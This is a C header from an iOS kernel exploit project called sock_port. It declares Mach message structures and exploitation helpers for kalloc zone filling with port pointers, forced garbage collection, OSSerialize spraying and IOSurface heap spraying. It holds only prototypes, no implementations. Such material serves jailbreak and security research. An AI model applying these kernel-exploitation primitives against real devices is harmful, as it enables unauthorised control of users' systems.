//
//  exploit_utilities.h
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#ifndef exploit_utilities_h
#define exploit_utilities_h

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <mach/mach.h>
#include <sched.h>
#include <sys/utsname.h>
#include <mach-o/loader.h>
#include "../iokit.h"

#include "iosurface.h"
#include "sockport2.h"
#include "kernel_memory.h"

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct simple_msg {
    mach_msg_header_t hdr;
    char buf[0];
};

#ifdef __LP64__
#ifndef    mig_external
#define mig_external
#endif    /* mig_external */
mig_external kern_return_t io_service_open_extended(mach_port_t service,
                                                    task_t owningTask,
                                                    uint32_t connect_type,
                                                    NDR_record_t ndr,
                                                    io_buf_ptr_t properties,
                                                    mach_msg_type_number_t propertiesCnt,
                                                    kern_return_t *result,
                                                    mach_port_t *connection);
#else
extern kern_return_t io_service_open_extended(mach_port_t               service,
                                              task_t                    owningTask,
                                              uint32_t                  connect_type,
                                              NDR_record_t              ndr,
                                              io_buf_ptr_t              properties,
                                              mach_msg_type_number_t    propertiesCnt,
                                              kern_return_t             *result,
                                              mach_port_t               *connection);
#endif

int get_kernel_anchor(addr_t *anchor);

size_t message_size_for_kalloc_size(size_t kalloc_size);
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition);
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size);
void trigger_gc(void);

void spray_OSSerialize(void* data, size_t size);

extern mach_vm_size_t pagesize;

extern const uint64_t IOSURFACE_CREATE_SURFACE;
extern const uint64_t IOSURFACE_SET_VALUE;
extern const uint64_t IOSURFACE_GET_VALUE;
extern const uint64_t IOSURFACE_DELETE_VALUE;

int init_IOSurface(void);
void deinit_IOSurface(void);
int spray_IOSurface(void *data, size_t size);

#endif /* exploit_utilities_h */
